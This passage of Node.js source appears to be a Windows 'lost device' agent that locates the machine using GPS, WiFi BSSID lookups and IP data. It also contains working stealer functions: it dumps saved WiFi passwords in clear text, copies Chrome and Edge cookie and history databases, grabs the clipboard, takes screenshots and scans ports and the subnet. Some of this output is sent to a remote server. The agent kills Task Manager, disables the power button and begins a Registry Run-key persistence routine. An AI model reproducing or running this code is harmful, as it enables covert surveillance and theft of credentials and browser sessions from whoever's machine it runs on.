    entry.bearing = bearing;
    entry.distanceFromLast = dist;

    // Add to decision engine
    decisionEngine.addPosition(lat, lng, accuracy, source);
  }

  return entry;
}

// ─── EXISTING TOOLS (ENHANCED) ──────────────────────────────────────────────

async function getWifiSignals() {
  const res = await runCommand('netsh wlan show networks mode=bssid');
  const bssids = [];
  if (res.success) {
    const lines = res.stdout.split('\n');
    let ssid = '', channel = 0;
    lines.forEach((l, i) => {
      if (l.includes('SSID') && !l.includes('BSSID')) ssid = l.split(':')[1]?.trim() || '';
      if (l.includes('Channel')) channel = parseInt(l.split(':')[1]) || 0;
      if (l.includes('BSSID')) {
        const mac = l.split(':').slice(1).join(':').trim();
        const sigLine = lines[i+1]?.trim() || '';
        const sig = parseInt(sigLine.split(':')[1]) || 0;
        const rssi = Math.round((sig / 2) - 100);
        bssids.push({
          ssid, bssid: mac, rssi, signal: sig, channel,
          frequency: channel <= 14 ? WIFI_FREQ_2_4GHZ : WIFI_FREQ_5GHZ,
          estimatedDistance: rssiToDistance(rssi, channel <= 14 ? WIFI_FREQ_2_4GHZ : WIFI_FREQ_5GHZ)
        });
      }
    });
  }
  return bssids;
}

async function getBluetoothSignals() {
  if (process.platform !== 'win32') return 'Not supported';
  const ps = 'Get-PnpDevice -Class Bluetooth | Select-Object FriendlyName, Status | ConvertTo-Json';
  const res = await runPowerShell(ps);
  if (res.success) {
    try { return JSON.parse(res.stdout); } catch(e) { return res.stdout; }
  }
  return [];
}

async function getWindowsGps() {
  const ps = `Add-Type -AssemblyName System.Device; $w=New-Object System.Device.Location.GeoCoordinateWatcher; $w.Start(); $c=0; while(($w.Status -ne 'Ready') -and ($c -lt 10)){Start-Sleep -ms 500;$c++}; $l=$w.Position.Location; if($l.IsUnknown -eq $false){Write-Output "GEO|$($l.Latitude)|$($l.Longitude)|$($l.HorizontalAccuracy)|$($l.Course)|$($l.Speed)"}`;
  const res = await runPowerShell(ps, 20000);
  if (res.success && res.stdout.startsWith('GEO|')) {
    const p = res.stdout.split('|');
    return { lat: parseFloat(p[1].replace(',', '.')), lng: parseFloat(p[2].replace(',', '.')), accuracy: parseFloat(p[3].replace(',', '.')), heading: parseFloat(p[4].replace(',', '.')), speed: parseFloat(p[5].replace(',', '.')), source: 'windows-gps', timestamp: Date.now() };
  }
  return null;
}

async function getGatewayMac() {
  if (process.platform !== 'win32') return null;
  const res = await runCommand('arp -a');
  if (res.success) {
    const lines = res.stdout.split('\n');
    for (const line of lines) {
      if (line.includes('dynamic') || line.includes('static')) {
        const parts = line.trim().split(/\s+/);
        if (parts.length >= 2) return parts[1];
      }
    }
  }
  return null;
}

async function getPreciseLocation(force = false) {
  log('info', 'Engaging ML multi-source location fusion engine...');

  // Collect ALL available sources simultaneously
  let gpsData = null, wifiData = [], ipData = null, bleData = [];

  // Fire all probes in parallel
  const [gpsResult, wifiResult, ipResult, bleResult] = await Promise.allSettled([
    getWindowsGps().catch(e => { log('warn', 'GPS failed:', e.message); return null; }),
    getWifiSignals().catch(e => { log('warn', 'WiFi scan failed:', e.message); return []; }),
    scrapePublicIP().catch(e => { log('warn', 'IP scrape failed:', e.message); return null; }),
    getBluetoothSignals().catch(e => { log('warn', 'BLE scan failed:', e.message); return []; })
  ]);

  gpsData = gpsResult.status === 'fulfilled' ? gpsResult.value : null;
  wifiData = wifiResult.status === 'fulfilled' ? (wifiResult.value || []) : [];
  ipData = ipResult.status === 'fulfilled' ? ipResult.value : null;
  bleData = bleResult.status === 'fulfilled' ? (bleResult.value || []) : [];

  // Try WiFi trilateration (BSSID lookup)
  let wifiTriResult = null;
  try { wifiTriResult = await getCellTowerTriangulation(); } catch(e) {}

  // Feed ALL data into the ML fusion engine
  const mlLocation = gpsData && gpsData.lat ? gpsData : (wifiTriResult || null);
  const mlState = decisionEngine.update(mlLocation, wifiData, ipData, bleData);

  log('info', `ML fusion: confidence=${(mlState.fusionScore*100).toFixed(1)}%, sources=[${mlState.sourcesUsed.join(',')}]`);

  // If ML engine produced a fused position with good accuracy, use it
  if (mlState.fusedLat && mlState.fusedLng && mlState.fusedAccuracy < 10000) {
    const fused = {
      lat: mlState.fusedLat,
      lng: mlState.fusedLng,
      accuracy: Math.round(mlState.fusedAccuracy),
      source: 'ml-fusion',
      confidence: mlState.fusionScore,
      riskLevel: mlState.riskLevel,
      movement: mlState.movementPattern,
      sourcesUsed: mlState.sourcesUsed,
      timestamp: Date.now()
    };
    log('info', `ML fused position: ${fused.lat.toFixed(6)}, ${fused.lng.toFixed(6)} ±${fused.accuracy}m`);
    decisionEngine.addPosition(fused.lat, fused.lng, fused.accuracy, 'ml-fusion');
    return fused;
  }

  // Fallback: return best individual source
  if (gpsData && gpsData.lat) {
    decisionEngine.addPosition(gpsData.lat, gpsData.lng, gpsData.accuracy, 'gps');
    return gpsData;
  }
  if (wifiTriResult && wifiTriResult.lat) {
    decisionEngine.addPosition(wifiTriResult.lat, wifiTriResult.lng, wifiTriResult.accuracy, 'wifi');
    return wifiTriResult;
  }

  // IP geolocation always returns something
  if (ipData && ipData.bestResult && ipData.bestResult.lat) {
    const loc = {
      lat: ipData.bestResult.lat,
      lng: ipData.bestResult.lng,
      accuracy: ipData.bestResult.accuracy || 5000,
      source: 'ip-geolocation',
      ip: ipData.confirmedIP,
      city: ipData.bestResult.city,
      region: ipData.bestResult.region,
      country: ipData.bestResult.country,
      isp: ipData.bestResult.isp,
      timestamp: Date.now()
    };
    decisionEngine.addPosition(loc.lat, loc.lng, loc.accuracy, 'ip');
    return loc;
  }

  log('warn', 'All location sources failed. No location available.');
  return null;
}

async function bssidServerLookup(wifi) {
  let tmpFile;
  try {
    const payload = JSON.stringify({ bssids: wifi });
    tmpFile = `C:\\Windows\\Temp\\bssid_${Date.now()}.json`;
    fs.writeFileSync(tmpFile, payload);
    const res = await runPowerShell(`$body=Get-Content -Raw -Path '${tmpFile}'; $r=Invoke-RestMethod -Uri '${SERVER_URL}/api/bssid-lookup' -Method Post -ContentType 'application/json' -Body $body -TimeoutSec 10; $r|ConvertTo-Json -Depth 4`, 15000);
    if (res.success) {
      const d = JSON.parse(res.stdout);
      if (d.success && d.lat && d.lng) return { lat: d.lat, lng: d.lng, accuracy: d.accuracy || 100, source: 'bssid-server', timestamp: Date.now() };
    }
  } catch(e) {}
  finally { if (tmpFile) try { fs.unlinkSync(tmpFile); } catch(e) {} }
  return null;
}

async function bssidFreeLookup(wifi) {
  for (const ap of wifi.slice(0, 5)) {
    if (!ap.bssid) continue;
    try {
      const res = await runCommand(`curl -s --max-time 3 "https://api.mylnikov.org/geolocation/v1/bssid?bssid=${ap.bssid}"`, 6000);
      if (res.success) {
        const d = JSON.parse(res.stdout);
        if (d.result === 200 && d.data && d.data.lat && d.data.lon) {
          return { lat: d.data.lat, lng: d.data.lon, accuracy: d.data.range || 200, source: 'bssid-free', timestamp: Date.now() };
        }
      }
    } catch(e) {}
  }
  return null;
}

async function getSystemStats() {
  const stats = { hostname: os.hostname(), platform: os.platform(), uptime: os.uptime() };
  stats.memory = { total: os.totalmem(), free: os.freemem(), usage: Math.round((1 - os.freemem() / os.totalmem()) * 100) };
  if (process.platform === 'win32') {
    const bat = await runPowerShell('WMIC Path Win32_Battery Get EstimatedChargeRemaining');
    if (bat.success) { const m = bat.stdout.match(/(\d+)/); if (m) stats.battery = parseInt(m[1]); }
  }
  return stats;
}

async function getDnsDump() { const r = await runCommand('ipconfig /displaydns'); await reportLog('dns-dump', r.stdout); return r.stdout; }
async function getPortAudit() { const r = await runCommand('netstat -ano'); await reportLog('port-audit', r.stdout); return r.stdout; }
async function getUsbAudit() { const r = await runPowerShell('Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\* | Select-Object FriendlyName, PSChildName'); await reportLog('usb-audit', r.stdout); return r.stdout; }
async function getPersistenceCheck() { const r = await runPowerShell('Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User'); await reportLog('persistence-check', r.stdout); return r.stdout; }
async function getProcessForensics() { const r = await runPowerShell('Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, Id, CPU, Path'); await reportLog('process-forensics', r.stdout); return r.stdout; }

async function getWifiPasswords() {
  if (process.platform !== 'win32') return 'Not supported';
  const ps = `
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    $results = @()
    foreach ($p in $profiles) {
      $pass = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
      $results += [PSCustomObject]@{ SSID = $p; Password = $pass }
    }
    $results | ConvertTo-Json`;
  const r = await runPowerShell(ps);
  await reportLog('wifi-passwords', r.stdout);
  return r.stdout;
}

async function getDeepSystemInfo() {
  if (process.platform !== 'win32') return 'Not supported';
  const ps = `
    $os = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture, LastBootUpTime
    $cpu = Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed
    $net = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, InterfaceAlias
    @{ OS=$os; CPU=$cpu; Network=$net } | ConvertTo-Json`;
  const r = await runPowerShell(ps);
  await reportLog('system-deep', r.stdout);
  return r.stdout;
}

async function takeScreenshot() {
  if (process.platform !== 'win32') return 'Not supported';
  const shotPath = path.join(LOG_DIR, `shot_${Date.now()}.png`);
  const ps = `
    Add-Type -AssemblyName System.Windows.Forms
    $s=[System.Windows.Forms.Screen]::PrimaryScreen
    $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height)
    $g=[System.Drawing.Graphics]::FromImage($b)
    $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size)
    $b.Save("${shotPath.replace(/\\/g, '\\\\')}", [System.Drawing.Imaging.ImageFormat]::Png)
    $b.Dispose(); $g.Dispose()`;
  await runPowerShell(ps);
  if (fs.existsSync(shotPath)) {
    const data = fs.readFileSync(shotPath).toString('base64');
    try { fs.unlinkSync(shotPath); } catch(e) {}
    return { screenshot: 'data:image/png;base64,' + data };
  }
  return 'Screenshot failed';
}

async function aggressiveLock() {
  if (process.platform !== 'win32') return;
  await runCommand('rundll32.exe user32.dll,LockWorkStation');
  await runPowerShell('Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class LockScreen { [DllImport("user32.dll")] public static extern bool LockWorkStation(); } \'; [LockScreen]::LockWorkStation()');
  await runCommand('tsdiscon').catch(() => {});
  if (isAdmin) await runCommand('taskkill /F /IM taskmgr.exe /T').catch(() => {});
}

async function suppressPowerButton(active = true) {
  if (process.platform !== 'win32' || !isAdmin) return;
  const val = active ? 0 : 1;
  await runCommand(`powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION ${val}`);
  await runCommand(`powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION ${val}`);
  await runCommand('powercfg /setactive SCHEME_CURRENT');
}

// ─── ADVANCED TRACKING COMMANDS ──────────────────────────────────────────────

async function deepIPScrape() {
  log('info', 'Performing deep IP scrape across all interfaces...');
  const results = {};

  // Public IP from multiple sources
  const publicIP = await scrapePublicIP();
  results.publicIP = publicIP;

  // All local interfaces
  const interfaces = os.networkInterfaces();
  results.localInterfaces = [];
  for (const [name, addrs] of Object.entries(interfaces)) {
    for (const addr of addrs) {
      if (!addr.internal) {
        results.localInterfaces.push({ name, address: addr.address, family: addr.family, mac: addr.mac });
      }
    }
  }

  // Active connections with remote IPs
  const connections = await runCommand('netstat -ano | findstr ESTABLISHED');
  results.activeConnections = connections.stdout;

  // Routing table
  const routes = await runPowerShell('Get-NetRoute | Select-Object DestinationPrefix, NextHop, InterfaceAlias | ConvertTo-Json');
  if (routes.success) try { results.routes = JSON.parse(routes.stdout); } catch(e) {}

  return results;
}

async function advancedWifiAnalysis() {
  log('info', 'Performing advanced WiFi analysis...');
  const wifi = await getWifiSignals();
  const fingerprint = buildWifiFingerprint(wifi);
  const network = await buildNetworkFingerprint();

  // Estimate position from WiFi
  let estimatedPosition = null;
  if (wifi.length >= 3) {
    estimatedPosition = await getCellTowerTriangulation();
  }

  return {
    networks: wifi,
    fingerprint: fingerprint,
    networkProfile: network,
    estimatedPosition,
    analysis: {
      totalNetworks: wifi.length,
      strongSignals: wifi.filter(a => a.rssi > -60).length,
      avgSignal: wifi.length > 0 ? Math.round(wifi.reduce((a, b) => a + b.rssi, 0) / wifi.length) : 0,
      closestAP: wifi.length > 0 ? wifi.reduce((a, b) => a.rssi > b.rssi ? a : b) : null,
      channelDistribution: wifi.reduce((acc, a) => { acc[a.channel] = (acc[a.channel] || 0) + 1; return acc; }, {}),
      frequencyBands: {
        '2.4GHz': wifi.filter(a => a.channel <= 14).length,
        '5GHz': wifi.filter(a => a.channel > 14).length
      }
    }
  };
}

async function portScan(target) {
  log('info', `Scanning ports on ${target || 'local network'}...`);
  const commonPorts = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 3306, 3389, 5900, 8080, 8443];
  const openPorts = [];

  for (const port of commonPorts) {
    const res = await runPowerShell(`Test-NetConnection -ComputerName ${target || '127.0.0.1'} -Port ${port} -WarningAction SilentlyContinue | Select-Object ComputerName, RemotePort, TcpTestSucceeded | ConvertTo-Json`, 5000);
    if (res.success) {
      try {
        const r = JSON.parse(res.stdout);
        if (r.TcpTestSucceeded) openPorts.push({ port, service: getServiceName(port) });
      } catch(e) {}
    }
  }

  return { target: target || 'localhost', openPorts, scanTime: Date.now() };
}

function getServiceName(port) {
  const services = { 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL', 1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP', 5900: 'VNC', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt' };
  return services[port] || 'Unknown';
}

async function networkScan() {
  log('info', 'Performing network scan...');
  const arp = await runCommand('arp -a');
  const ifconfig = await runPowerShell('Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, InterfaceAlias, PrefixLength | ConvertTo-Json');
  const gateway = await runPowerShell('Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1 NextHop | ConvertTo-Json');

  // Try to discover hosts on subnet
  let hosts = [];
  if (ifconfig.success) {
    try {
      const interfaces = JSON.parse(ifconfig.stdout);
      for (const iface of (Array.isArray(interfaces) ? interfaces : [interfaces])) {
        if (iface.IPAddress && iface.PrefixLength >= 24) {
          const subnet = iface.IPAddress.split('.').slice(0, 3).join('.');
          // Quick ping sweep of common IPs
          for (let i = 1; i <= 20; i++) {
            const pingRes = await runPowerShell(`Test-Connection -ComputerName ${subnet}.${i} -Count 1 -Quiet -TimeoutSeconds 1`, 2000);
            if (pingRes.success && pingRes.stdout.trim() === 'True') {
              hosts.push({ ip: `${subnet}.${i}`, status: 'online' });
            }
          }
          break;
        }
      }
    } catch(e) {}
  }

  return { arp: arp.stdout, interfaces: ifconfig.stdout, gateway: gateway.stdout, discoveredHosts: hosts };
}

async function bluetoothProximityScan() {
  log('info', 'Scanning Bluetooth devices with proximity...');
  if (process.platform !== 'win32') return 'Not supported';

  const devices = await getBluetoothSignals();

  // Get signal strength of connected BT devices
  const ps = `
    Get-PnpDevice -Class Bluetooth -Status OK | ForEach-Object {
      $name = $_.FriendlyName
      $id = $_.InstanceId
      $info = Get-PnpDeviceProperty -InstanceId $id -KeyName DEVPKEY_BluetoothRadio_Authenticated
      [PSCustomObject]@{ Name=$name; InstanceId=$id; Authenticated=$info.Data }
    } | ConvertTo-Json`;

  const detailed = await runPowerShell(ps);
  return { basicDevices: devices, detailedDevices: detailed.stdout };
}

// ─── ADVANCED SCRAPING TOOLS ──────────────────────────────────────────────────

async function cookieDump() {
  log('info', 'Dumping browser cookies...');
  const cookies = {};
  if (process.platform === 'win32') {
    // Chrome/Edge cookies
    const chromePaths = [
      path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
      path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
    ];
    for (const cookiePath of chromePaths) {
      if (fs.existsSync(cookiePath)) {
        try {
          const tempPath = path.join(os.tmpdir(), `cookies_${Date.now()}.db`);
          fs.copyFileSync(cookiePath, tempPath);
          const ps = `
            Add-Type -AssemblyName System.Data.SQLite
            $conn = New-Object System.Data.SQLite.SQLiteConnection
            $conn.ConnectionString = "Data Source=${tempPath.replace(/\\/g, '\\\\')};Read Only=True"
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly FROM cookies"
            $reader = $cmd.ExecuteReader()
            $results = @()
            while ($reader.Read()) {
              $results += [PSCustomObject]@{
                host = $reader.GetString(0)
                name = $reader.GetString(1)
                value = $reader.GetString(2)
                path = $reader.GetString(3)
                expires = $reader.GetInt64(4)
                secure = $reader.GetBoolean(5)
                httponly = $reader.GetBoolean(6)
              }
            }
            $conn.Close()
            $results | ConvertTo-Json -Depth 3
          `;
          const res = await runPowerShell(ps, 10000);
          if (res.success && res.stdout.trim()) {
            const browser = cookiePath.includes('Chrome') ? 'Chrome' : 'Edge';
            try { cookies[browser] = JSON.parse(res.stdout); } catch(e) {}
          }
          try { fs.unlinkSync(tempPath); } catch(e) {}
        } catch(e) {}
      }
    }
  }
  return { cookies, timestamp: Date.now() };
}

async function clipboardGrab() {
  log('info', 'Grabbing clipboard contents...');
  if (process.platform === 'win32') {
    const ps = `
      Add-Type -AssemblyName System.Windows.Forms
      $text = [System.Windows.Forms.Clipboard]::GetText()
      $files = [System.Windows.Forms.Clipboard]::GetFileDropList()
      $image = [System.Windows.Forms.Clipboard]::GetImage()
      $result = @{ Text=$text; FileCount=$files.Count; HasImage=$null -ne $image }
      if($files.Count -gt 0){ $result.Files = $files | ForEach-Object { $_.FullName } }
      $result | ConvertTo-Json
    `;
    const res = await runPowerShell(ps, 5000);
    if (res.success) try { return JSON.parse(res.stdout); } catch(e) { return { text: res.stdout }; }
  }
  return { error: 'Not supported on this platform' };
}

async function envDump() {
  log('info', 'Dumping environment variables...');
  const env = { ...process.env };
  // Remove sensitive keys
  const sensitive = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'AUTH', 'PRIVATE', 'CREDENTIAL'];
  for (const key of Object.keys(env)) {
    if (sensitive.some(s => key.toUpperCase().includes(s))) {
      env[key] = '[REDACTED]';
    }
  }
  // Add system info
  env._SYSTEM = {
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    memory: `${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB`,
    hostname: os.hostname(),
    user: os.userInfo().username,
    home: os.homedir()
  };
  return { environment: env, timestamp: Date.now() };
}

async function historyDump() {
  log('info', 'Dumping browser history...');
  const history = {};
  if (process.platform === 'win32') {
    const historyPaths = [
      { browser: 'Chrome', path: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History') },
      { browser: 'Edge', path: path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History') }
    ];
    for (const { browser, path: historyPath } of historyPaths) {
      if (fs.existsSync(historyPath)) {
        try {
          const tempPath = path.join(os.tmpdir(), `history_${browser}_${Date.now()}.db`);
          fs.copyFileSync(historyPath, tempPath);
          const ps = `
            Add-Type -AssemblyName System.Data.SQLite
            $conn = New-Object System.Data.SQLite.SQLiteConnection
            $conn.ConnectionString = "Data Source=${tempPath.replace(/\\/g, '\\\\')};Read Only=True"
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
            $reader = $cmd.ExecuteReader()
            $results = @()
            while ($reader.Read()) {
              $results += [PSCustomObject]@{
                url = $reader.GetString(0)
                title = $reader.GetString(1)
                visits = $reader.GetInt32(2)
                lastVisit = $reader.GetInt64(3)
              }
            }
            $conn.Close()
            $results | ConvertTo-Json -Depth 3
          `;
          const res = await runPowerShell(ps, 10000);
          if (res.success && res.stdout.trim()) {
            try { history[browser] = JSON.parse(res.stdout); } catch(e) {}
          }
          try { fs.unlinkSync(tempPath); } catch(e) {}
        } catch(e) {}
      }
    }
  }
  return { history, timestamp: Date.now() };
}

async function installedApps() {
  log('info', 'Enumerating installed applications...');
  if (process.platform === 'win32') {
    const ps = `
      $apps = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object { $_.DisplayName -and $_.DisplayVersion } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation, UninstallString
      $apps += Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object { $_.DisplayName -and $_.DisplayVersion } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation, UninstallString
      $apps | Sort-Object DisplayName -Unique | ConvertTo-Json -Depth 3
    `;
    const res = await runPowerShell(ps, 15000);
    if (res.success) try { return { apps: JSON.parse(res.stdout), count: JSON.parse(res.stdout).length, timestamp: Date.now() }; } catch(e) {}
  }
  return { error: 'Not supported' };
}

async function geoTriangulate() {
  log('info', 'Performing geo triangulation from WiFi + IP...');
  const wifi = await getWifiSignals();
  const ipData = await scrapePublicIP();
  const fingerprint = buildWifiFingerprint(wifi);
  const network = await buildNetworkFingerprint();

  // Get positioned APs
  const positionedAPs = [];
  for (const ap of fingerprint.bssids.slice(0, 10)) {
    try {
      const res = await runCommand(`curl -s --max-time 3 "https://api.mylnikov.org/geolocation/v1/bssid?bssid=${ap.bssid}"`, 5000);
      if (res.success) {
        const d = JSON.parse(res.stdout);
        if (d.result === 200 && d.data) {
          positionedAPs.push({ ...ap, lat: d.data.lat, lng: d.data.lon, range: d.data.range || 200 });
        }
      }
    } catch(e) {}
  }

  let triangulated = null;
  if (positionedAPs.length >= 3) {
    triangulated = trilaterate(positionedAPs);
  } else if (positionedAPs.length >= 2) {
    // Weighted centroid fallback
    let wLat = 0, wLng = 0, totalW = 0;
    for (const ap of positionedAPs) {
      const w = 1 / (ap.estimatedDistance ** 2 + 1);
      wLat += ap.lat * w;
      wLng += ap.lng * w;
      totalW += w;
    }
    triangulated = { lat: wLat / totalW, lng: wLng / totalW, accuracy: Math.round(200 + positionedAPs.reduce((a,b) => a + b.estimatedDistance, 0)), source: 'wifi-weighted' };
  }

  // Combine with IP location
  let bestLoc = triangulated;
  if (ipData.bestResult && ipData.bestResult.lat) {
    const ipLoc = { lat: ipData.bestResult.lat, lng: ipData.bestResult.lng, accuracy: ipData.bestResult.accuracy || 5000, source: 'ip' };
    if (!bestLoc || triangulated.accuracy > ipLoc.accuracy) {
      bestLoc = ipLoc;
    }
  }

  return {
    wifiPosition: triangulated,
    ipPosition: ipData.bestResult ? { lat: ipData.bestResult.lat, lng: ipData.bestResult.lng, accuracy: ipData.bestResult.accuracy, source: 'ip' } : null,
    bestEstimate: bestLoc,
    apCount: positionedAPs.length,
    wifiNetworks: wifi.length,
    timestamp: Date.now()
  };
}

async function openPortsDeep() {
  log('info', 'Deep port scan...');
  const commonPorts = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 3306, 3389, 5900, 8080, 8443, 27017, 6379, 5432, 1521, 5000, 8000, 8888, 9000, 9200, 9300];
  const openPorts = [];
  const netstat = await runCommand('netstat -ano');
  
  for (const port of commonPorts) {
    // Check if port is already listening locally
    if (netstat.stdout.includes(`:${port} `) && netstat.stdout.includes('LISTENING')) {
      openPorts.push({ port, service: getServiceName(port), state: 'LISTENING', local: true });
    } else {
      // Test external connectivity
      const res = await runPowerShell(`Test-NetConnection -ComputerName 127.0.0.1 -Port ${port} -WarningAction SilentlyContinue | Select-Object RemotePort, TcpTestSucceeded | ConvertTo-Json`, 3000);
      if (res.success) {
        try {
          const r = JSON.parse(res.stdout);
          if (r.TcpTestSucceeded) openPorts.push({ port, service: getServiceName(port), state: 'OPEN', local: false });
        } catch(e) {}
      }
    }
  }
  return { openPorts, scanTime: Date.now(), totalScanned: commonPorts.length };
}

async function registryDump() {
  log('info', 'Dumping critical registry keys...');
  if (process.platform === 'win32') {
    const keys = [
      'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run',
      'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
      'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
      'HKLM:\\System\\CurrentControlSet\\Services',
      'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies',
      'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies'
    ];
    const results = {};
    for (const key of keys) {
      const ps = `
        if (Test-Path '${key}') {
          Get-ItemProperty '${key}' | Select-Object * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSProvider | ConvertTo-Json -Depth 2
        } else {
          @{} | ConvertTo-Json
        }
      `;
      const res = await runPowerShell(ps, 5000);
      if (res.success) try { results[key] = JSON.parse(res.stdout); } catch(e) { results[key] = res.stdout; }
    }
    return { registry: results, timestamp: Date.now() };
  }
  return { error: 'Not supported' };
}

async function activeConnections() {
  log('info', 'Enumerating active network connections...');
  const results = {};
  
  // netstat
  const netstat = await runCommand('netstat -ano');
  results.netstat = netstat.stdout;
  
  // Get process names for PIDs
  const pids = [...new Set(netstat.stdout.match(/\s+(\d+)\s*$/gm)?.map(m => m.trim()) || [])];
  const procMap = {};
  for (const pid of pids.slice(0, 30)) {
    const ps = `Get-Process -Id ${pid} -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, Path | ConvertTo-Json`;
    const res = await runPowerShell(ps, 3000);
    if (res.success) try { const p = JSON.parse(res.stdout); procMap[pid] = p.ProcessName; } catch(e) {}
  }
  results.processMap = procMap;
  
  // Get-NetTCPConnection
  const tcp = await runPowerShell('Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | ConvertTo-Json');
  if (tcp.success) try { results.tcpConnections = JSON.parse(tcp.stdout); } catch(e) {}
  
  // Get-NetUDPEndpoint
  const udp = await runPowerShell('Get-NetUDPEndpoint | Select-Object LocalAddress, LocalPort, OwningProcess | ConvertTo-Json');
  if (udp.success) try { results.udpEndpoints = JSON.parse(udp.stdout); } catch(e) {}
  
  return { ...results, timestamp: Date.now() };
}

async function systemScreenshot() {
  log('info', 'Taking system screenshot...');
  return await takeScreenshot();
}

// ─── HEARTBEAT WITH FULL INTEL ──────────────────────────────────────────────

async function sendForensicHeartbeat() {
  const loc = await getPreciseLocation();
  const wifi = await getWifiSignals();
  const bt = await getBluetoothSignals();
  const stats = await getSystemStats();
  const network = await buildNetworkFingerprint();
  const ipData = await scrapePublicIP();

  stats.isAdmin = isAdmin;
  stats.lostMode = isLostMode;

  // ML Decision Engine update
  const mlState = decisionEngine.update(loc, wifi, ipData.bestResult, bt);

  const payload = {
    deviceId: pairCode || deviceId,
    location: loc || { source: 'heartbeat-only' },
    systemInfo: stats,
    forensicData: {
      wifi,
      bluetooth: bt,
      networkFingerprint: network,
      publicIP: ipData.confirmedIP,
      ipSources: ipData.sourceCount,
      mlDecision: mlState,
      motion: {
        velocity: decisionEngine.velocityBuffer.length > 0 ? decisionEngine.velocityBuffer[decisionEngine.velocityBuffer.length - 1] : 0,
        status: mlState.movementPattern,
        confidence: mlState.confidence,
        pathDistance: mlState.pathDistance || 0
      }
    }
  };

  send({ type: 'location', ...payload });

  // HTTP backup
  try {
    await httpPost('/heartbeat', payload);
  } catch(e) {}
}

async function reportLog(tool, output, level = 'info', influence = 0) {
  try { await httpPost('/log', { deviceId, tool, output, level, influence }); } catch(e) {}
}

// ─── AUTONOMOUS RECOVERY LOOP ───────────────────────────────────────────────

async function startAutonomousForensics() {
  if (!isLostMode) return;
  log('info', 'Starting autonomous recovery loop...');

  // Run all tracking tools
  await Promise.allSettled([
    getWifiSignals().then(w => reportLog('auto-wifi', w, 'info', 0.9)),
    getPreciseLocation(true).then(l => {
      if (l) send({ type: 'location', deviceId: pairCode || deviceId, location: l });
    }),
    deepIPScrape().then(ip => reportLog('auto-ip-scrape', ip, 'info', 0.8)),
    advancedWifiAnalysis().then(wa => reportLog('auto-wifi-analysis', wa, 'info', 0.7)),
    buildNetworkFingerprint().then(nf => reportLog('auto-network-fp', nf, 'info', 0.6))
  ]);

  if (isAdmin) {
    await Promise.allSettled([
      getPortAudit(),
      getDnsDump()
    ]);
  }

  // ML decision: adjust interval based on movement
  const mlReport = decisionEngine.getReport();
  const nextInterval = mlReport.movementPattern === 'stationary' ? 60000 :
    mlReport.movementPattern === 'walking' ? 30000 :
    mlReport.movementPattern.includes('vehicle') ? 10000 : 30000;

  log('info', `Next scan in ${nextInterval/1000}s (pattern: ${mlReport.movementPattern}, confidence: ${(mlReport.confidence * 100).toFixed(1)}%)`);
  setTimeout(startAutonomousForensics, nextInterval);
}

// ─── PERSISTENCE ─────────────────────────────────────────────────────────────

async function ensurePersistence() {
  if (process.platform !== 'win32') return;
  const agentPath = process.argv[1];
  if (!agentPath) return;

  // 1. Registry Run key (fast, runs at login)
